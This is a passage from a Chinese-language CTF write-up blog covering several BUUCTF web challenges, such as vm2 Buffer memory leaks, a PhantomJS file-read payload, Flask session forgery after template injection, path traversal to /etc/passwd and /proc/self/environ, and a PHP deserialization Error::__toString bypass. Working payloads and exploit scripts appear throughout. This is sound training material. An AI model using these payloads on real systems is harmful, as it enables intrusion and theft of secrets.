/file_upload HTTP/1.1</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=--------------------------919695033422425209299810</span></span><br><span class="line"><span class="string">Content-Length: 291</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">----------------------------919695033422425209299810</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;flag.pug&quot;</span></span><br><span class="line"><span class="string">Content-Type: ../template</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">doctype html</span></span><br><span class="line"><span class="string">html</span></span><br><span class="line"><span class="string">  head</span></span><br><span class="line"><span class="string">    style</span></span><br><span class="line"><span class="string">      include ../../../../../../../flag.txt</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">----------------------------919695033422425209299810--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">GET /flag HTTP/1.1</span></span><br><span class="line"><span class="string">x:&#x27;&#x27;&#x27;</span></span><br><span class="line">payload = payload.replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="string">&#x27;0xff&#x27;</span> + <span class="built_in">hex</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:].zfill(<span class="number">2</span>), <span class="number">16</span>)) <span class="keyword">for</span> c <span class="keyword">in</span> payload)</span><br><span class="line"><span class="comment"># print(payload)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">requests.get(<span class="string">&#x27;http://f04dd623-9444-4bfb-80e8-9117c5247c3f.node3.buuoj.cn/core?q=&#x27;</span> + urllib.parse.quote(payload))</span><br><span class="line">getflag = <span class="string">&#x27;http://f04dd623-9444-4bfb-80e8-9117c5247c3f.node3.buuoj.cn/?action=flag&#x27;</span></span><br><span class="line">res = requests.get(getflag)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>


<h2 id="HITCON-2016-Leaking"><a href="#HITCON-2016-Leaking" class="headerlink" title="[HITCON 2016]Leaking"></a>[HITCON 2016]Leaking</h2><p>知识点：VM2</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> randomstring = <span class="built_in">require</span>(<span class="string">&quot;randomstring&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> &#123;</span><br><span class="line">    VM</span><br><span class="line">&#125; = <span class="built_in">require</span>(<span class="string">&quot;vm2&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"><span class="keyword">var</span> flag = <span class="built_in">require</span>(<span class="string">&quot;./config.js&quot;</span>).flag</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&quot;/&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    res.header(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;text/plain&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*    Orange is so kind so he put the flag here. But if you can guess correctly :P    */</span></span><br><span class="line">    <span class="built_in">eval</span>(<span class="string">&quot;var flag_&quot;</span> + randomstring.generate(<span class="number">64</span>) + <span class="string">&quot; = \&quot;hitcon&#123;&quot;</span> + flag + <span class="string">&quot;&#125;\&quot;;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> (req.query.data &amp;&amp; req.query.data.length &lt;= <span class="number">12</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> vm = <span class="keyword">new</span> VM(&#123;</span><br><span class="line">            timeout: <span class="number">1000</span></span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="built_in">console</span>.log(req.query.data);</span><br><span class="line">        res.send(<span class="string">&quot;eval -&gt;&quot;</span> + vm.run(req.query.data));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.send(fs.readFileSync(__filename).toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">3000</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;listening on port 3000!&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>


<p>用的是[HFCTF2020]JustEscape的payload</p>
<p>关于这里为什么是data[]，是为了绕过<code>req.query.data &amp;&amp; req.query.data.length &lt;= 12</code></p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu61.jpg"></p>
<p><strong>看了wp，官方解法是利用buffer的未清零特征</strong></p>
<blockquote>
<p><strong>在较早一点的 node 版本中 (8.0 之前)，当 Buffer 的构造函数传入数字时, 会得到与数字长度一致的一个 Buffer，并且这个 Buffer 是未清零的。8.0 之后的版本可以通过另一个函数 Buffer.allocUnsafe(size) 来获得未清空的内存。</strong></p>
</blockquote>
<p><strong>注：关于 <code>Buffer</code></strong><br><strong>JavaScript 语言自身只有字符串数据类型，没有二进制数据类型。</strong><br><strong>但在处理像TCP流或文件流时，必须使用到二进制数据。因此在 Node.js中，定义了一个 <code>Buffer</code> 类，该类用来创建一个专门存放二进制数据的缓存区。</strong></p>
<p><strong>只要是调用过的变量，一定会存在内存中，所以需要使用<code>Buffer()</code>来读取内存，使用<code>data=Buffer(500)</code>分配一个<code>800</code>的单位为<code>8</code>位字节的<code>buffer</code>，编写Python3的EXP：</strong></p>
<p>payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&#x27;http://98c8eee2-5f60-47d8-a283-9e8a1f7ed1fb.node3.buuoj.cn/?data=Buffer(500)&#x27;</span></span><br><span class="line">response = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> response:</span><br><span class="line">        req = requests.get(url)</span><br><span class="line">        response = req.text</span><br><span class="line">        print(req.status_code)</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag&#123;&#x27;</span> <span class="keyword">in</span> response:</span><br><span class="line">            print(response)</span><br><span class="line">            <span class="keyword">break</span>   </span><br></pre></td></tr></table></figure>


<h2 id="FireshellCTF2020-ScreenShooter"><a href="#FireshellCTF2020-ScreenShooter" class="headerlink" title="[FireshellCTF2020]ScreenShooter"></a>[FireshellCTF2020]ScreenShooter</h2><p>知识点：PhantomJS</p>
<p>通过查看请求头，在user-agent发现使用PhantomJS</p>
<blockquote>
<p>Phantom JS是一个服务器端的 JavaScript API 的 WebKit。其支持各种Web标准： DOM 处理, CSS 选择器, JSON, Canvas, 和 SVG</p>
</blockquote>
<p>搜索PhantomJS发现存在任意文件上传漏洞CVE-2019-17221，该漏洞通过file://URL的XMLHttpRequest触发</p>
<p><a href="https://web.archive.org/web/20191220171022/https://www.darkmatter.ae/blogs/breaching-the-perimeter-phantomjs-arbitrary-file-read/" target="_blank">Breaching the perimeter - PhantomJs Arbitrary file read</a></p>
<p>payload:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">		<span class="keyword">var</span> karsa;</span></span><br><span class="line"><span class="javascript">		karsa = <span class="keyword">new</span> XMLHttpRequest;</span></span><br><span class="line"><span class="javascript">		karsa.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">			<span class="built_in">document</span>.write(<span class="built_in">this</span>.responseText)</span></span><br><span class="line">		&#125;;</span><br><span class="line"><span class="javascript">		karsa.open(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;file:///flag&quot;</span>);</span></span><br><span class="line">		karsa.send();</span><br><span class="line">	<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>做法同URL TO PDF</p>
<h2 id="FBCTF2019-Event"><a href="#FBCTF2019-Event" class="headerlink" title="[FBCTF2019]Event"></a>[FBCTF2019]Event</h2><p>知识点：</p>
<ol>
<li>模板注入</li>
<li>session伪造</li>
</ol>
<p>随便注册一波 账号npfs,密码123，到admin panel 发现要admin登入，抓包看下session，尝试篡改cookie来提权，但是加密方式未知，密钥未知。我们先注入点，fuzz发现在<code>event_important</code>参数存在模版注入，输入<code>__class__</code>，发现成功回显.</p>
<p>接着查找配置文件：<code>__class__.__init__.__globals__[app].config</code> ，得到key</p>
<blockquote>
<p>fb+wwn!n1yo+9c(9s6!_3o#nqm&amp;&amp;_ej$tez)$_ik36n8d7o6mr#y</p>
</blockquote>
<p>我们把两个session都解密看一下</p>
<p>这里user的值才是用来判断admin的，所有我们要伪造的是名为user的session,</p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu62-1.jpg"></p>
<p>但是我们解密发现，字符串只有一个npfs，也就是我注册的用户名，我们无法直接伪造，这里用到了脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> SecureCookieSessionInterface</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">b&#x27;fb+wwn!n1yo+9c(9s6!_3o#nqm&amp;&amp;_ej$tez)$_ik36n8d7o6mr#y&#x27;</span></span><br><span class="line">session_serializer = SecureCookieSessionInterface().get_signing_serializer(app)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    print(session_serializer.dumps(<span class="string">&quot;admin&quot;</span>))</span><br><span class="line">index()</span><br></pre></td></tr></table></figure>
<p>得到的user代替原来的即可伪造成功获得flag</p>
<h2 id="PASECA2019-honey-shop"><a href="#PASECA2019-honey-shop" class="headerlink" title="[PASECA2019]honey_shop"></a>[PASECA2019]honey_shop</h2><p>知识点：</p>
<ol>
<li>Flask中的Session伪造</li>
<li><code>/environ</code>记录当前进程的环境变量信息</li>
<li><code>/proc/self</code>其路径指向当前进程</li>
</ol>
<p>启动环境，是一个蜂蜜购买解密，有1366美金，购买flag需要1337美金，美金不足，猜测为session伪造，抓包，将session利用flask-session-master工具解密，</p>
<p>获得解密后的值：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;balance&#x27;</span>: <span class="number">1336</span>, <span class="string">&#x27;purchases&#x27;</span>: []&#125;</span><br></pre></td></tr></table></figure>
<p>确实包含金额，所有接下去要做的就是得到key</p>
<p>观察页面，发现大图片下方有一行小字</p>
<blockquote>
<p><em>click to download our sweet images</em></p>
</blockquote>
<p>之前省赛做到过类似的，web中对于这种可下载地方一般存在任意文件下载，下载抓包</p>
<p>修改其<code>image</code>的值为：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/download?image=../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
<p>发送数据包，得到<code>/etc/passwd</code>文件内容，确定存在任意文件下载漏洞</p>
<p>当路径为<code>../../proc/self/environ</code>时，得到key</p>
<blockquote>
<p>SECRET_KEY=XXZrJ0UpZONF6PHmmqsr2OzfuDsQQxxgbkCncTKj</p>
</blockquote>
<p>使用<strong>flask-session-cookie</strong>加密脚本<a target="_blank" rel="noopener" href="https://github.com/noraj/flask-session-cookie-manager">Github地址</a>：</p>
<blockquote>
<p>python3 flask_session_cookie_manager3.py encode -s ‘XXZrJ0UpZONF6PHmmqsr2OzfuDsQQxxgbkCncTKj’  -t “{‘balance’: 1337, ‘purchases’: []}”</p>
</blockquote>
<p>将得到的session进行替换，购买即可得到flag</p>
<h2 id="极客大挑战-2020-Greatphp"><a href="#极客大挑战-2020-Greatphp" class="headerlink" title="[极客大挑战 2020]Greatphp"></a>[极客大挑战 2020]Greatphp</h2><p>知识点：</p>
<ol>
<li>Error::toString</li>
<li>反序列化</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYCLOVER</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>( (<span class="keyword">$this</span>-&gt;syc != <span class="keyword">$this</span>-&gt;lover) &amp;&amp; (md5(<span class="keyword">$this</span>-&gt;syc) === md5(<span class="keyword">$this</span>-&gt;lover)) &amp;&amp; (sha1(<span class="keyword">$this</span>-&gt;syc)=== sha1(<span class="keyword">$this</span>-&gt;lover)) )&#123;</span><br><span class="line">           <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="keyword">$this</span>-&gt;syc, <span class="variable">$match</span>))&#123;</span><br><span class="line">               <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;syc);</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">die</span>(<span class="string">&quot;Try Hard !!&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">           </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;great&#x27;</span>]))&#123;</span><br><span class="line">    unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;great&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>传入的 syc 和 lover 要求值不等但 md5 加密后相等</p>
<p>题目过滤了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  ( ) <span class="string">&quot; &#x27;</span></span><br></pre></td></tr></table></figure>
<p>之后会进行命令执行</p>
<p><strong>md5()和sha1()可以对一个类进行hash，并且会触发这个类的 <code>__toString</code> 方法；且当eval()函数传入一个类对象时，也会触发这个类里的 <code>__toString</code> 方法。所以我们可以使用含有 <code>__toString</code> 方法的PHP内置类来绕过，用的两个比较多的内置类就是 <code>Exception</code> 和 <code>Error</code> ，他们之中有一个 <code>__toString</code> 方法，当类被当做字符串处理时，就会调用这个函数</strong></p>
<p><strong>这里以<code>Error</code> 类为例，我们来看看当触发他的 <code>__toString</code> 方法时会发生什么：</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br></pre></td></tr></table></figure>
<p><strong>输出如下：</strong></p>
<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line"><span class="keyword">Error: </span>payload in /usercode/file.php:2</span><br><span class="line">Stack trace:</span><br><span class="line">#0 &#123;main&#125;</span><br></pre></td></tr></table></figure>
<p><strong>发现会以字符串的形式输出当前报错，包含当前的错误信息（payload）以及当前报错的行号（2），而传入 <code>Error(&quot;payload&quot;,1)</code> 中的错误代码“1”则没有输出出来。</strong></p>
<p><strong>在来看看下一个例子：</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);<span class="variable">$b</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\r\n\r\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br></pre></td></tr></table></figure>
<p><strong>输出如下：</strong></p>
<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line"><span class="keyword">Error: </span>payload in /usercode/file.php:2</span><br><span class="line">Stack trace:</span><br><span class="line">#0 &#123;main&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">Error: </span>payload in /usercode/file.php:2</span><br><span class="line">Stack trace:</span><br><span class="line">#0 &#123;main&#125;</span><br></pre></td></tr></table></figure>
<p><strong>可见，<code>$a</code> 和 <code>$b</code> 这两个对象本身是不同的，但是 <code>__toString</code> 方法返回的结果是相同的。注意，这里之所以需要在同一行是因为 <code>__toString</code> 返回的数据包含当前行号。</strong></p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu63.jpg"></p>
<p><code>Exception</code> 类与 <code>Error</code> 的使用和结果完全一样，只不过 <code>Exception</code> 类适用于PHP 5和7，而 <code>Error</code> 只适用于 PHP 7</p>
<p>我们可以将题目代码中的 <code>$syc</code> 和 <code>$lover</code> 分别声明为类似上面的内置类的对象，让这两个对象本身不同（传入的错误代码不同即可），但是 <code>__toString</code> 方法输出的结果相同即可。</p>
<p>由于题目用preg_match过滤了小括号无法调用函数，所以我们尝试直接 <code>include &quot;/flag&quot; </code>将flag包含进来即可；由于过滤了引号，我们直接用url取反绕过即可。</p>
<p>payload:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYCLOVER</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>( (<span class="keyword">$this</span>-&gt;syc != <span class="keyword">$this</span>-&gt;lover) &amp;&amp; (md5(<span class="keyword">$this</span>-&gt;syc) === md5(<span class="keyword">$this</span>-&gt;lover)) &amp;&amp; (sha1(<span class="keyword">$this</span>-&gt;syc)=== sha1(<span class="keyword">$this</span>-&gt;lover)) )&#123;</span><br><span class="line">            <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="keyword">$this</span>-&gt;syc, <span class="variable">$match</span>))&#123;</span><br><span class="line">                <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;syc);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;Try Hard !!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;?&gt;&lt;?=include~&quot;</span>.urldecode(<span class="string">&quot;%D0%99%93%9E%98&quot;</span>).<span class="string">&quot;?&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$str</span>,<span class="number">1</span>);<span class="variable">$b</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$str</span>,<span class="number">2</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> SYCLOVER();</span><br><span class="line"><span class="variable">$c</span>-&gt;syc = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;lover = <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span>(urlencode(serialize(<span class="variable">$c</span>)));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<h2 id="极客大挑战-2020-Roamphp1-Welcome"><a href="#极客大挑战-2020-Roamphp1-Welcome" class="headerlink" title="[极客大挑战 2020]Roamphp1-Welcome"></a>[极客大挑战 2020]Roamphp1-Welcome</h2><p>知识点：</p>
<ol>
<li>POST</li>
<li>sha1数组绕过</li>
</ol>
<p>没啥好说的，可以利用数组绕过</p>
<p>payload:POST传参</p>
<blockquote>
<p>roam1[]=1&amp;roam2[]=2</p>
</blockquote>
<h2 id="PwnThyBytes-2019-Baby-SQL"><a href="#PwnThyBytes-2019-Baby-SQL" class="headerlink" title="[PwnThyBytes 2019]Baby_SQL"></a>[PwnThyBytes 2019]Baby_SQL</h2><p>知识点：SQL注入（PHP_SESSION_UPLOAD_PROGRESS）</p>
<p>source.zip获得源码，index.php有全局转义,转义了所有传过去的参数：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_SESSION</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>): <span class="variable">$_SESSION</span>[<span class="variable">$key</span>] = filter(<span class="variable">$value</span>); <span class="keyword">endforeach</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>): <span class="variable">$_GET</span>[<span class="variable">$key</span>] = filter(<span class="variable">$value</span>); <span class="keyword">endforeach</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>): <span class="variable">$_POST</span>[<span class="variable">$key</span>] = filter(<span class="variable">$value</span>); <span class="keyword">endforeach</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>): <span class="variable">$_REQUEST</span>[<span class="variable">$key</span>] = filter(<span class="variable">$value</span>); <span class="keyword">endforeach</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    !is_string(<span class="variable">$value</span>) <span class="keyword">AND</span> <span class="keyword">die</span>(<span class="string">&quot;Hacking attempt!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> addslashes(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>]) <span class="keyword">AND</span> <span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>] === <span class="string">&quot;register&quot;</span> <span class="keyword">AND</span> <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span> <span class="keyword">AND</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) <span class="keyword">AND</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) <span class="keyword">AND</span> @<span class="keyword">include</span>(<span class="string">&#x27;templates/register.php&#x27;</span>);</span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>]) <span class="keyword">AND</span> <span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>] === <span class="string">&quot;login&quot;</span> <span class="keyword">AND</span> <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;GET&#x27;</span> <span class="keyword">AND</span> <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]) <span class="keyword">AND</span> <span class="keyword">isset</span>(<span 